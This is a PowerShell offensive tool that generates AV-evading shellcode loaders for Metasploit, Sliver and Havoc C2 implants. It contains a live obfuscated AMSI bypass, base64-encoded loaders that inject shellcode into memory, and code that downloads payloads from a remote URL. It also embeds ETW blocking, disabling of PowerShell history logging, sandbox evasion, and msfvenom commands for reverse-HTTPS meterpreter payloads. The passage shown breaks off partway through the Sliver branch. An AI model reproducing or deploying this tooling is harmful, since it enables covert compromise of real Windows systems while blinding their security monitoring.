# ================================================================================================================================================
# Invoke-PoSH-ShellCodeLoader is a shellcode loader script generator that aims to bypass AV solutions such as Windows Defender.
# It works with shellcodes generated with the following C2 frameworks: Metasploit, Sliver and Havoc.
# Author: https://github.com/Jean-Francois-C / GNU General Public License v3.0
# ================================================================================================================================================
# Features:
# - Shellcode injection into the memory of the current process
# - AES encryption and GZip/Deflate compression (based on 'Xencrypt')
# - AMSI bypass
# - Blocking Event Tracing for Windows (ETW)
# - Disabling PowerShell history logging
# - Basic sandbox evasion techniques (optional -sandbox)
# ================================================================================================================================================
# Usage:
# > Import-Module ./Invoke-PoSH-ShellCodeLoader.ps1
# > Invoke-PoSH-ShellCodeLoader -Type=MSF/Sliver/Havoc -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1
# > Invoke-PoSH-ShellCodeLoader -Type=MSF/Sliver/Havoc -FilePath C:\path\shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1
# ================================================================================================================================================
# Input: 
# ------
# Example 1 (Metapsloit shellcode)
# > msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/path/cert.pem LHOST=IP LPORT=port -a x64 -f raw -o shellcode 
# ------
# Example 2 (Sliver shellcode)
# [server] sliver > generate --arch amd64 -f shellcode --http IP -l --os Windows --save shellcode 
# $ xxd -p shellcode | tr -d '\n' | sed 's/.\{2\}/0x&,/g' > shellcode2
# $ sed '$ s/.$//' shellcode2 > shellcode
# ================================================================================================================================================

Write-Output "
  ___     ___ _  _     ___ _        _ _  ___         _     _                _         
 | _ \___/ __| || |___/ __| |_  ___| | |/ __|___  __| |___| |   ___  __  __| |___ ___ 
 |  _/ _ \__ \ __ |___\__ \ ' \/ -_) | | (__/ _ \/ _  / -_| |__/ _ \/ _|/ _  / -_)  _|
 |_| \___/___/_||_|   |___/_||_\___|_|_|\___\___/\__,_\___|____\___/\__,\__,_\___|_|  
                                                                                     v2.0
Usage:
> Import-Module ./Invoke-PoSH-ShellCodeLoader.ps1
> Invoke-PoSH-ShellCodeLoader -Type MSF/Sliver/Havoc -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1
> Invoke-PoSH-ShellCodeLoader -Type MSF/Sliver/Havoc -FilePath C:\path\shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1

Features:
[*] Shellcode injection into the memory of the current process
[*] AES encryption and GZip/Deflate compression
[*] AMSI bypass
[*] Blocking Event Tracing for Windows (ETW)
[*] Disabling PowerShell history logging
[*] Basic sandbox evasion techniques (optional -sandbox)
"

# ''A'''M''S''I''-''B''Y''P''A''S''S''
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].ASSeMBly.GEtTYPe(("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('o'+'ma'+'t'+''+'ion.'),'.A',('Am'+''+'s'+'iU'+'t'+''),'ls',('S'+'yste'+'m.'+'M'+'anag'+'e'+'men'+'t'),'i')).GEtFieLd(("{2}{0}{1}" -f 'i',('Co'+'n'+'text'),('am'+'s')),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" -f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GEtVaLUe($null),0x41414141);

function Invoke-PoSH-ShellCodeLoader {
	
    [CmdletBinding()]
    Param (
	
        [ValidateSet("MSF","Sliver","Havoc")]
        [string]
        $Type = "MSF",
		
        [Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $Filepath,
		 
        [Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $Fileurl,
	
        [Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [switch] $Sandbox,
		
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $Outfile = $(Throw("-OutFile is required"))
		)

    Process {

	switch ($Type) {
    'MSF' {
        $TempShellCodeLoaderFile = "C:\Windows\Temp\templateloader.ps1"
        $ShellcodeLoaderPart1 = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("ZnVuY3Rpb24gSmVmZiB7CiAgICAgICAgUGFyYW0gKCRvSSwgJHFSTTZlKQogICAgICAgICRNeW1pID0gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoKICAgICAgICByZXR1cm4gJE15bWkuR2V0TWV0aG9kKCdHZXRQcm9jQWRkcmVzcycsIFtUeXBlW11dQChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZl0sIFtTdHJpbmddKSkuSW52b2tlKCRudWxsLCBAKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmXShOZXctT2JqZWN0IFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWYoKE5ldy1PYmplY3QgSW50UHRyKSwgKCRNeW1pLkdldE1ldGhvZCgnR2V0TW9kdWxlSGFuZGxlJykpLkludm9rZSgkbnVsbCwgQCgkb0kpKSkpLCAkcVJNNmUpKQp9CmZ1bmN0aW9uIHBkIHsKICAgICAgICBQYXJhbSAoCiAgICAgICAgICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkbGQsCiAgICAgICAgICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSldIFtUeXBlXSAkdHdsID0gW1ZvaWRdCiAgICAgICAgKQoKICAgICAgICAkTmljbyA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgoTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoJ1JlZmxlY3RlZERlbGVnYXRlJykpLCBbU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5Bc3NlbWJseUJ1aWxkZXJBY2Nlc3NdOjpSdW4pLkRlZmluZUR5bmFtaWNNb2R1bGUoJ0luTWVtb3J5TW9kdWxlJywgJGZhbHNlKS5EZWZpbmVUeXBlKCdNeURlbGVnYXRlVHlwZScsICdDbGFzcywgUHVibGljLCBTZWFsZWQsIEFuc2lDbGFzcywgQXV0b0NsYXNzJywgW1N5c3RlbS5NdWx0aWNhc3REZWxlZ2F0ZV0pCiAgICAgICAgJE5pY28uRGVmaW5lQ29uc3RydWN0b3IoJ1JUU3BlY2lhbE5hbWUsIEhpZGVCeVNpZywgUHVibGljJywgW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OlN0YW5kYXJkLCAkbGQpLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQogICAgICAgICROaWNvLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJHR3bCwgJGxkKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCiAgICAgICAgcmV0dXJuICROaWNvLkNyZWF0ZVR5cGUoKQp9CltCeXRlW11dJHpxWSA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIg==")))
        $ShellcodeLoaderPart2 = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("IikKW1VpbnQzMl0ka0poc3MgPSAwCiRnZF8xayA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKChKZWZmIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MpLCAocGQgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdLCBbVUludDMyXSkgKFtJbnRQdHJdKSkpLkludm9rZShbSW50UHRyXTo6WmVybywgJHpxWS5MZW5ndGgsMHgzMDAwLCAweDA0KQoKW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkenFZLCAwLCAkZ2RfMWssICR6cVkubGVuZ3RoKQppZiAoKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKChKZWZmIGtlcm5lbDMyLmRsbCBWaXJ0dWFsUHJvdGVjdCksIChwZCBAKFtJbnRQdHJdLCBbVUludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pKSkuSW52b2tlKCRnZF8xaywgW1VpbnQzMl0kenFZLkxlbmd0aCwgMHgxMCwgW1JlZl0ka0poc3MpKSAtZXEgJHRydWUpIHsKICAgICAgICAkVmluY2VudCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKChKZWZmIGtlcm5lbDMyLmRsbCBDcmVhdGVUaHJlYWQpLCAocGQgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdKSAoW0ludFB0cl0pKSkuSW52b2tlKFtJbnRQdHJdOjpaZXJvLDAsJGdkXzFrLFtJbnRQdHJdOjpaZXJvLDAsW0ludFB0cl06Olplcm8pCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoKEplZmYga2VybmVsMzIuZGxsIFdhaXRGb3JTaW5nbGVPYmplY3QpLCAocGQgQChbSW50UHRyXSwgW0ludDMyXSkpKS5JbnZva2UoJFZpbmNlbnQsMHhmZmZmZmZmZikgfCBPdXQtTnVsbAp9")))

        if ($Filepath) {	
        Write-Output "[*] Loading the Meterpreter shellcode: '$($Filepath)"
        $ShellCodebyte = [IO.File]::ReadAllBytes($Filepath)
        $ShellCodebyteencoded = [convert]::ToBase64String($ShellCodebyte)
        Write-Output "[*] Creating the shellcode loader script"
        [System.IO.File]::WriteAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart1);
        [System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodebyteencoded);
        [System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart2);
        }
        elseif ($Fileurl){
        Write-Output "[*] Downloading the Meterpreter shellcode: '$($Fileurl)'"
        #$ShellCodestring = echo(New-Object Net.WebClient).DownloadString($Fileurl);
        $Webclient = [Net.WebRequest]::Create($Fileurl)
        $Webclient.Proxy = [Net.WebRequest]::GetSystemWebProxy()
        $Webclient.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
        $Webclient.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
        $response = $Webclient.GetResponse()
        $respStream = $response.GetResponseStream()
        $buffer = New-Object byte[] $response.ContentLength
        $writeStream = New-Object IO.MemoryStream $response.ContentLength
        do {
        	$bytesRead = $respStream.Read($buffer, 0, $buffer.Length)
        	$writeStream.Write($buffer, 0, $bytesRead)
        }
        while ($bytesRead -gt 0)
        $ShellCodebyte = New-Object byte[] $response.ContentLength
        [Array]::Copy($writeStream.GetBuffer(), $ShellCodebyte, $response.ContentLength)
        $respStream.Close()
        $response.Close()
        $ShellCodebyteencoded = [convert]::ToBase64String($ShellCodebyte)
        Write-Output "[*] Creating the shellCode loader script"
        [System.IO.File]::WriteAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart1);
        [System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodebyteencoded);
        [System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart2);
        }
        
        $paddingmodes = 'PKCS7','ISO10126','ANSIX923','Zeros'
        $paddingmode = $paddingmodes | Get-Random
        $ciphermodes = 'ECB','CBC'
        $ciphermode = $ciphermodes | Get-Random

        $keysizes = 128,192,256
        $keysize = $keysizes | Get-Random

        $compressiontypes = 'Gzip','Deflate'
        $compressiontype = $compressiontypes | Get-Random

        Write-Output "[*] File compression (GZip/Deflate)"
        $TempShellCodeLoaderFileRead = [System.IO.File]::ReadAllBytes($TempShellCodeLoaderFile)
        Del "C:\Windows\Temp\templateloader.ps1"
        [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
        if ($compressiontype -eq "Gzip") {
        	$compressionStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
        } 
        elseif ( $compressiontype -eq "Deflate") {
        	$compressionStream = New-Object System.IO.Compression.DeflateStream $output, ([IO.Compression.CompressionMode]::Compress)
        }
        $compressionStream.Write( $TempShellCodeLoaderFileRead, 0, $TempShellCodeLoaderFileRead.Length )
        $compressionStream.Close()
        $output.Close()
        $compressedBytes = $output.ToArray()

        $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
        if ($ciphermode -eq 'CBC') {
        	$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        } 
        elseif ($ciphermode -eq 'ECB') {
        	$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB
        }
        if ($paddingmode -eq 'PKCS7') {
        	$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        } 
        elseif ($paddingmode -eq 'ISO10126') {
        	$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ISO10126
        } 
        elseif ($paddingmode -eq 'ANSIX923') {
        	$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ANSIX923
        } 
        elseif ($paddingmode -eq 'Zeros') {
        	$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        }

        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
        $aesManaged.GenerateKey()
        $b64key = [System.Convert]::ToBase64String($aesManaged.Key)

        Write-Output "[*] File encryption (AES)"
        $encryptor = $aesManaged.CreateEncryptor()
        $encryptedData = $encryptor.TransformFinalBlock($compressedBytes, 0, $compressedBytes.Length);
        [byte[]] $fullData = $aesManaged.IV + $encryptedData
        $aesManaged.Dispose()
        $b64encrypted = [System.Convert]::ToBase64String($fullData)
        
        $ShellCodeLoaderFile = ''
        
        if ($sandbox) {	
        Write-Output "[*] Adding basic sandbox checks"
        $code_fixed_order1 += '${17} = "aWYgKFQnZSdzJ3QnLVBBdEggVmFyJ2knYSdiJ2xlOlBTJ0QnZSdiJ3VnQ09OdGVYdCkge"' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order1 -join ''
        $code_fixed_order2 += '${18} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${17}+"2V4aXR9IGVsc2Uge1MndCdhJ1JULVNsRSdFcCAtcyA2MH07"))' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order2 -join ''
        $code_fixed_order3 += "iN'v'Oke-exPReS'S'iOn"+'(${18})' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order3 -join ''
        }
        
        Write-Output "[*] Adding 'A'M'S'I' bypass"
        $code_fixed_order4 += '${9} = "JGJ5cCA9IFtSZWZdLkFzc2VtYmx5LkdldFR5cGVzKCk7Rm9yRWFjaCgkYmEgaW4gJGJ5cCkge2lmICgkYmEuTmFtZSAtbGlrZSAiKml1dGlscyIpIHskY2EgPSAkYmF9fTskZGEgPSAkY2EuR2V0RmllbG"' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order4 -join ''
        $code_fixed_order5 += '${10} = "RzKCdOb25QdWJsaWMsU3RhdGljJyk7Rm9yRWFjaCgkZWEgaW4gJGRhKSB7aWYgKCRlYS5OYW1lIC1saWtlICIqaXRGYWlsZWQiKSB7JGZhID0gJGVhfX07JGZhLlNldFZhbHVlKCRudWxsLCR0cnVlKTsK"' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order5 -join ''
        $code_fixed_order6 += '${11} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${9}+${10}))' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order6 -join ''
        $code_fixed_order7 += "iN'v'Oke-exPReS'S'iOn"+'(${11})' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order7 -join ''
        
        Write-Output "[*] Adding 'E'T'W' bypass" 
        $code_fixed_order8 += '${12} = "R5cGUoJ1N5c3RlbS5NYW5hJysnZ2VtZW50LkF1dG8nKydtYXRpb24uVHJhY2luZy5QU0V0Jysnd0xvZ1ByJysnb3ZpZGVyJykuR0V0RmllTEQoJ2V0Jysnd1Byb3YnKydpZGVyJywnTm9uUCcrJ3VibGljLFN0YXRpYycpLkdlVFZhTHVlKCRudWxsKSwwKQ=="' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order8 -join ''
        $code_fixed_order9 += '${13} = "W1JlZmxlQ3RpT04uQXNzRU1ibHldOjpMT0FkV2l0aFBBUnRpYWxOYU1lKCdTeXN0ZW0uQ29yZScpLkdlVFRZUGUoJ1N5c3QnKydlbS5EaWFnbicrJ29zdGljcy5FdmUnKydudGluZy5FdmVuJysndFByb3ZpZGVyJykuR2V0RmllbGQoJ21fZW5hYmxlZCcsJ05vblB1YmxpYyxJbnN0YW5jZScpLlNldFZhbHVlKFtSZWZdLkFzU0VtYkxZLkdldF"' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order9 -join ''
        $code_fixed_order10 += '${14} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${13}+${12})))' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order10 -join ''
        $code_fixed_order11 += "iN'v'Oke-exPReS'S'iOn"+'(${14})' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order11 -join ''
        
        Write-Output "[*] Disabling PoSh history logging"
        $code_fixed_order12 += '${15} = "U2V0LVBTUmVBZExJbmVPcFRpb24g"' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order12 -join ''
        $code_fixed_order13 += '${16} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${15}+"LUhpc3RvcnlTYXZlU3R5bGUgU2F2J2VOJ290aCdpbidn")))' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order13 -join ''
        $code_fixed_order14 += "iN'v'Oke-exPReS'S'iOn"+'(${16})' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order14 -join ''
        
        $Code_alternatives  = @()
        $Code_alternatives += '${2} = [System.Convert]::FromBase64String("{0}")' + "`r`n"
        $Code_alternatives += '${3} = [System.Convert]::FromBase64String("{1}")' + "`r`n"
        $Code_alternatives += '${4} = New-Object "System.Security.Cryptography.AesManaged"' + "`r`n"
        $Code_alternatives_shuffled = $Code_alternatives | Sort-Object {Get-Random}
        $ShellCodeLoaderFile += $Code_alternatives_shuffled -join ''
        
        $Code_alternatives  = @()
        $Code_alternatives += '${4}.Mode = [System.Security.Cryptography.CipherMode]::'+$ciphermode + "`r`n"
        $Code_alternatives += '${4}.Padding = [System.Security.Cryptography.PaddingMode]::'+$paddingmode + "`r`n"
        $Code_alternatives += '${4}.BlockSize = 128' + "`r`n"
        $Code_alternatives += '${4}.KeySize = '+$keysize + "`n" + '${4}.Key = ${3}' + "`r`n"
        $Code_alternatives += '${4}.IV = ${2}[0..15]' + "`r`n"
        $Code_alternatives_shuffled = $Code_alternatives | Sort-Object {Get-Random}
        $ShellCodeLoaderFile += $Code_alternatives_shuffled -join ''

        $Code_alternatives  = @()
        $Code_alternatives += '${6} = New-Object System.IO.MemoryStream(,${4}.CreateDecryptor().TransformFinalBlock(${2},16,${2}.Length-16))' + "`r`n"
        $Code_alternatives += '${7} = New-Object System.IO.MemoryStream' + "`r`n"
        $Code_alternatives_shuffled = $Code_alternatives | Sort-Object {Get-Random}
        $ShellCodeLoaderFile += $Code_alternatives_shuffled -join ''

        if ($compressiontype -eq "Gzip") {
        	$ShellCodeLoaderFile += '${5} = New-Object System.IO.Compression.GzipStream ${6}, ([IO.Compression.CompressionMode]::Decompress)'    + "`r`n"
        } 
        elseif ( $compressiontype -eq "Deflate") {
        	$ShellCodeLoaderFile += '${5} = New-Object System.IO.Compression.DeflateStream ${6}, ([IO.Compression.CompressionMode]::Decompress)' + "`r`n"
        }
        $ShellCodeLoaderFile += '${5}.CopyTo(${7})' + "`r`n"

        $Code_alternatives  = @()
        $Code_alternatives += '${5}.Close()' + "`r`n"
        $Code_alternatives += '${4}.Dispose()' + "`r`n"
        $Code_alternatives += '${6}.Close()' + "`r`n"
        $Code_alternatives += '${8} = [System.Text.Encoding]::UTF8.GetString(${7}.ToArray())' + "`r`n"
        $Code_alternatives_shuffled = $Code_alternatives | Sort-Object {Get-Random}
        $ShellCodeLoaderFile += $Code_alternatives_shuffled -join ''

        $ShellCodeLoaderFile += ('Invoke-Expression','IEX' | Get-Random)+'(${8})' + "`r`n"
        
        $code = $ShellCodeLoaderFile -f $b64encrypted, $b64key, (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var)
        $TempShellCodeLoaderFileRead = [System.Text.Encoding]::UTF8.GetBytes($Code)
        
        Write-Output "[*] The obfuscated & encrypted Meterpreter shellcode loader script has been saved: '$($Outfile)' ..."
        [System.IO.File]::WriteAllText($Outfile,$Code)
        Write-Output "[+] Done!"
        }
        
    'Sliver' {
        $TempShellCodeLoaderFile = "C:\Windows\Temp\templateloader.ps1"
        $ShellcodeLoaderPart1 = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JE5pY29sYXMgPSBAIgpbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIFZpcnR1YWxBbGxvYyhJbnRQdHIgbHBBZGRyZXNzLCB1aW50IGR3U2l6ZSwgdWludCBmbEFsbG9jYXRpb25UeXBlLCB1aW50IGZsUHJvdGVjdCk7CltEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQpwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlVGhyZWFkKEludFB0ciBscFRocmVhZEF0dHJpYnV0ZXMsIHVpbnQgZHdTdGFja1NpemUsIEludFB0ciBscFN0YXJ0QWRkcmVzcywgSW50UHRyIGxwUGFyYW1ldGVyLCB1aW50IGR3Q3JlYXRpb25GbGFncywgSW50UHRyIGxwVGhyZWFkSWQpOwoiQAokSmVmZiA9IEFkZC1UeXBlIC1tZW1iZXJEZWZpbml0aW9uICROaWNvbGFzIC1OYW1lICJXaW4zMiIgLW5hbWVzcGFjZSBXaW4zMkZ1bmN0aW9ucyAtcGFzc3RocnUKCltCeXRlW11dICRidWYgPSA=")))
        $ShellcodeLoaderPart2 = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("CiRWaW5jZW50ID0gJEplZmY6OlZpcnR1YWxBbGxvYygwLFtNYXRoXTo6TWF4KCRidWYuTGVuZ3RoLDB4MTAwMCksMHgzMDAwLDB4NDApCltTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJGJ1ZiwwLCRWaW5jZW50LCRidWYuTGVuZ3RoKQokSmVmZjo6Q3JlYXRlVGhyZWFkKDAsMCwkVmluY2VudCwwLDAsMCk=")))

        if ($Filepath) {	
        Write-Output "[*] Loading the Sliver shellcode: '$($Filepath)"
        $ShellCodestring = Get-Content $Filepath

        Write-Output "[*] Creating the shellcode loader script"
        [System.IO.File]::WriteAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart1);
        [System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $Shellcodeformated + "`r`n");
        [System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart2);
        }
        elseif ($Fileurl){
        Write-Output "[*] Downloading the Sliver shellcode: '$($Fileurl)'"
        $ShellCodestring = echo(New-Object Net.WebClient).DownloadString($Fileurl);
        Write-Output "[*] Creating the shellCode loader script"
        [System.IO.File]::WriteAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart1);
        [System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodestring + "`r`n");
        [System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart2);
        }
        
        $paddingmodes = 'PKCS7','ISO10126','ANSIX923','Zeros'
        $paddingmode = $paddingmodes | Get-Random
        $ciphermodes = 'ECB','CBC'
        $ciphermode = $ciphermodes | Get-Random

        $keysizes = 128,192,256
        $keysize = $keysizes | Get-Random

        $compressiontypes = 'Gzip','Deflate'
        $compressiontype = $compressiontypes | Get-Random

        Write-Output "[*] File compression (GZip/Deflate)"
        $TempShellCodeLoaderFileRead = [System.IO.File]::ReadAllBytes($TempShellCodeLoaderFile)
        Del "C:\Windows\Temp\templateloader.ps1"
        [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
        if ($compressiontype -eq "Gzip") {
        	$compressionStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
        } 
        elseif ( $compressiontype -eq "Deflate") {
        	$compressionStream = New-Object System.IO.Compression.DeflateStream $output, ([IO.Compression.CompressionMode]::Compress)
        }
        $compressionStream.Write( $TempShellCodeLoaderFileRead, 0, $TempShellCodeLoaderFileRead.Length )
        $compressionStream.Close()
        $output.Close()
        $compressedBytes = $output.ToArray()

        $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
        if ($ciphermode -eq 'CBC') {
        	$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        } 
        elseif ($ciphermode -eq 'ECB') {
        	$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB
        }
        if ($paddingmode -eq 'PKCS7') {
        	$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        } 
        elseif ($paddingmode -eq 'ISO10126') {
        	$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ISO10126
        } 
        elseif ($paddingmode -eq 'ANSIX923') {
        	$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ANSIX923
        } 
        elseif ($paddingmode -eq 'Zeros') {
        	$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        }

        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
        $aesManaged.GenerateKey()
        $b64key = [System.Convert]::ToBase64String($aesManaged.Key)

        Write-Output "[*] File encryption (AES)"
        $encryptor = $aesManaged.CreateEncryptor()
        $encryptedData = $encryptor.TransformFinalBlock($compressedBytes, 0, $compressedBytes.Length);
        [byte[]] $fullData = $aesManaged.IV + $encryptedData
        $aesManaged.Dispose()
        $b64encrypted = [System.Convert]::ToBase64String($fullData)
        
        $ShellCodeLoaderFile = ''
        
        if ($sandbox) {	
        Write-Output "[*] Adding basic sandbox checks"
        $code_fixed_order1 += '${17} = "aWYgKFQnZSdzJ3QnLVBBdEggVmFyJ2knYSdiJ2xlOlBTJ0QnZSdiJ3VnQ09OdGVYdCkge"' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order1 -join ''
        $code_fixed_order2 += '${18} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${17}+"2V4aXR9IGVsc2Uge1MndCdhJ1JULVNsRSdFcCAtcyA2MH07"))' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order2 -join ''
        $code_fixed_order3 += "iN'v'Oke-exPReS'S'iOn"+'(${18})' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order3 -join ''
        }
        
        Write-Output "[*] Adding 'A'M'S'I' bypass"
        $code_fixed_order4 += '${9} = "JGJ5cCA9IFtSZWZdLkFzc2VtYmx5LkdldFR5cGVzKCk7Rm9yRWFjaCgkYmEgaW4gJGJ5cCkge2lmICgkYmEuTmFtZSAtbGlrZSAiKml1dGlscyIpIHskY2EgPSAkYmF9fTskZGEgPSAkY2EuR2V0RmllbG"' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order4 -join ''
        $code_fixed_order5 += '${10} = "RzKCdOb25QdWJsaWMsU3RhdGljJyk7Rm9yRWFjaCgkZWEgaW4gJGRhKSB7aWYgKCRlYS5OYW1lIC1saWtlICIqaXRGYWlsZWQiKSB7JGZhID0gJGVhfX07JGZhLlNldFZhbHVlKCRudWxsLCR0cnVlKTsK"' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order5 -join ''
        $code_fixed_order6 += '${11} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${9}+${10}))' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order6 -join ''
        $code_fixed_order7 += "iN'v'Oke-exPReS'S'iOn"+'(${11})' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order7 -join ''
        
        Write-Output "[*] Adding 'E'T'W' bypass" 
